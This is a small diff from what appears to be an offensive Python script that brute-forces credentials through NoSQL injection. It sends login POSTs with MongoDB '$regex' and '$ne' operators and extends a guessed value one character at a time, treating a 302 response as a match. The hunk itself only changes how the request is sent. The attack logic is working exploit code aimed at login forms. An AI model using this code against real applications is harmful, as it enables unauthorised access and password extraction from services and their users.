@@ -94,7 +94,7 @@ for firstChar in characters:
 		for char in characters:
 			payload = userpass + char
 			post_data = {para1 + '[$regex]' : "^" + payload + ".*", para2 + '[$ne]' : '1' + otherpara}
-			r = requests.post(url, data=post_data, allow_redirects=False)
+			r = method(url, post_data)
 	
 			if r.status_code == 302:
 				print(Fore.YELLOW + "Pattern found: " + payload)
